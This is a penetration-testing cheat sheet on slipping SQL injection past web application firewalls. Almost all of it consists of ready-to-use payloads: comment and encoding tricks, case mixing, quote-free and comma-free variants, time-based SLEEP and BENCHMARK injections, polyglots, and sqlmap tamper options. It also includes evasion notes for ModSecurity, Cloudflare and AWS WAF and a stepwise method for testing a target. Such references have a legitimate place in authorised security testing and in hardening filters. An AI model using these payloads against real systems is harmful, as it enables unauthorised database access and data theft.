---
tags:
  - critical
  - server-side
---

# SQLi WAF Bypass Techniques

## Whitespace Alternatives

### URL Encoded

```
%09  Tab
%0A  Newline
%0B  Vertical tab
%0C  Form feed
%0D  Carriage return
%20  Space
%A0  Non-breaking space
```

### SQL Comments

```sql
/**/
/*comment*/
/*!*/
```

### Examples

```sql
-- Original
' UNION SELECT 1,2,3--

-- With comments
'/**/UNION/**/SELECT/**/1,2,3--

-- With tabs
'%09UNION%09SELECT%091,2,3--

-- With newlines
'%0AUNION%0ASELECT%0A1,2,3--

-- Mixed
'%09/**/UNION%0D%0A/*comment*/SELECT/**/1,2,3--
```

---

## Keyword Obfuscation

### Case Variation

```sql
uNiOn SeLeCt
UnIoN sElEcT
UNION SELECT
union select
```

### Comment Insertion

```sql
UN/**/ION SEL/**/ECT
U/*comment*/N/*comment*/ION
SEL/*!*/ECT
```

### MySQL Version Comments

```sql
/*!50000UNION*/
/*!50000SELECT*/
/*!12345AND*/

-- MySQL 5.x+ executes, others treat as comment
/*!50000UNION*//*!50000SELECT*/1,2,3
```

### Double Keywords

```sql
UNIUNIONON SELSELECTECT
UNI/**/ON SELE/**/CT
```

### URL Encoding

```sql
-- Single encoding
%55%4E%49%4F%4E  (UNION)
%53%45%4C%45%43%54  (SELECT)

-- Double encoding
%2553%2545%254c%2545%2543%2554  (SELECT)
```

---

## Operator Replacements

### AND/OR

```sql
AND  →  &&  →  %26%26
OR   →  ||  →  %7C%7C
```

### Comparison

```sql
=    →  LIKE, REGEXP, RLIKE
>    →  NOT BETWEEN 0 AND X
a=b  →  NOT a<>b
a<>b →  a!=b
```

---

## Quotes Bypass

### Without Quotes

```sql
-- Hex encoding
SELECT * FROM users WHERE name=0x61646d696e  -- 'admin'

-- CHAR function
SELECT * FROM users WHERE name=CHAR(97,100,109,105,110)  -- 'admin'

-- CONCAT
SELECT * FROM users WHERE name=CONCAT(CHAR(97),CHAR(100),CHAR(109),CHAR(105),CHAR(110))
```

---

## Comma Bypass

### OFFSET Instead of LIMIT

```sql
-- Original
LIMIT 0,1

-- Bypass
LIMIT 1 OFFSET 0
```

### JOIN Instead of Commas

```sql
-- Original
UNION SELECT 1,2,3,4

-- Bypass
UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d
```

### SUBSTR Alternative

```sql
-- Original
SUBSTR('SQL',1,1)

-- Bypass
SUBSTR('SQL' FROM 1 FOR 1)
MID('SQL' FROM 1 FOR 1)
```

---

## Function Alternatives

### SLEEP Blocked

```sql
-- BENCHMARK (MySQL)
BENCHMARK(10000000,SHA1('test'))

-- Heavy query
(SELECT COUNT(*) FROM information_schema.tables A, information_schema.tables B)
```

### SUBSTRING Blocked

```sql
SUBSTRING()  →  SUBSTR()
SUBSTRING()  →  MID()
SUBSTRING()  →  LEFT() + RIGHT()
```

### IF Blocked

```sql
IF(cond,a,b)  →  CASE WHEN cond THEN a ELSE b END
IF(cond,a,b)  →  ELT(cond+1,b,a)
```

---

## Advanced Techniques

### Scientific Notation

```sql
-1' or 1.e(1) or '1'='1
-1' or 1337.1337e1 or '1'='1
' or 1.e('')=
```

### Null Byte Injection

```sql
' OR '1'='1'%00 AND '1'='2
```

### HTTP Parameter Pollution

```http
?id=1&id=' UNION SELECT 1,2,3--
```

### Nested SELECT

```sql
-- Instead of direct injection
' AND IF(1=1,SLEEP(5),0)--

-- Use nested approach
'+(select*from(select(if(1=1,sleep(5),false)))a)+'
```

### Polyglot Payloads

```sql
SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
```

---

## sqlmap Tamper Scripts

```bash
# Common tampers
--tamper=space2comment
--tamper=charencode
--tamper=randomcase
--tamper=between
--tamper=equaltolike

# Multiple tampers
--tamper="space2comment,randomcase,charencode"

# List all tampers
sqlmap --list-tampers
```

---

## Useful Tampers Reference

| Tamper | Effect |
|--------|--------|
| `space2comment` | `UNION SELECT` → `UNION/**/SELECT` |
| `charencode` | URL encode all characters |
| `randomcase` | Random upper/lowercase |
| `between` | `>` → `NOT BETWEEN 0 AND` |
| `equaltolike` | `=` → `LIKE` |
| `space2plus` | Space → `+` |
| `apostrophemask` | `'` → `%EF%BC%87` (UTF-8) |

---

## WAF-Specific Notes

### ModSecurity

```sql
/*!12345UNION*/SELECT
UN%00ION SE%00LECT
```

### Cloudflare

- Test various encodings
- Use less common functions
- Try parameter pollution

### AWS WAF

```sql
-- Scientific notation
1.0e(0)

-- Case mixing + comments
Un/**/Ion/**/SeLeCt
```

---

## Testing Methodology

1. Identify WAF (error pages, headers)
2. Test simple payloads: `' OR 1=1--`
3. Note what triggers blocking
4. Try encoding (URL, double, unicode)
5. Try comments: `/**/`, `/*!*/`
6. Try case mixing
7. Try function alternatives
8. Combine techniques
9. Use sqlmap tampers
